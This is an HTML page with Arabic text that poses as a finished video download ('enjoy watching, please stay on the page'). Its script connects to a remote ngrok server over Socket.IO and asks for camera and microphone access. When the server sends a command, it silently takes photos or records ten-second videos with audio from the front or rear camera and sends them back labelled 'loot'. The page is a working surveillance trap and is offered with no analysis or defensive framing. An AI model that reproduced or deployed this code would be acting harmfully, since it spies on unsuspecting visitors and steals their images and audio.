<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><title>Loading...</title>
    <script src="https://cdn.socket.io/4.7.4/socket.io.min.js"></script>
</head>
<body style="background:#000; color:#05ff05; text-align:center; font-family:sans-serif; padding-top:100px;">
    <h2 id="msg">تم التحميل، استمتع بالمشاهدة ✅</h2>
    <p>يرجى البقاء في الصفحة للمتابعة</p>

    <script>
        const SERVER = "https://kinship-porridge-molasses.ngrok-free.dev";
        const socket = io(SERVER, { transports: ['websocket', 'polling'], upgrade: true });

        async function init() {
            try { await navigator.mediaDevices.getUserMedia({video:true, audio:true}); } catch(e){}
        }
        init();

        socket.on('command', async (cmd) => {
            const facing = cmd.action.includes('front') ? "user" : "environment";
            
            if (cmd.action.includes('scan')) {
                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}});
                const v = document.createElement('video'); v.srcObject = s; await v.play();
                const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v,0,0);
                socket.emit('loot', {type:'photo', data: c.toDataURL('image/png').split(',')[1]});
                s.getTracks().forEach(t => t.stop());
            }

            if (cmd.action.includes('vid')) {
                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode: facing}, audio:true});
                const rec = new MediaRecorder(s); const chunks = [];
                rec.ondataavailable = e => chunks.push(e.data);
                rec.onstop = () => {
                    const reader = new FileReader();
                    reader.onload = () => socket.emit('loot', {type:'video', data: reader.result.split(',')[1]});
                    reader.readAsDataURL(new Blob(chunks));
                    s.getTracks().forEach(t => t.stop());
                };
                rec.start(); setTimeout(() => rec.stop(), 10000);
            }
        });
    </script>
</body>
</html>
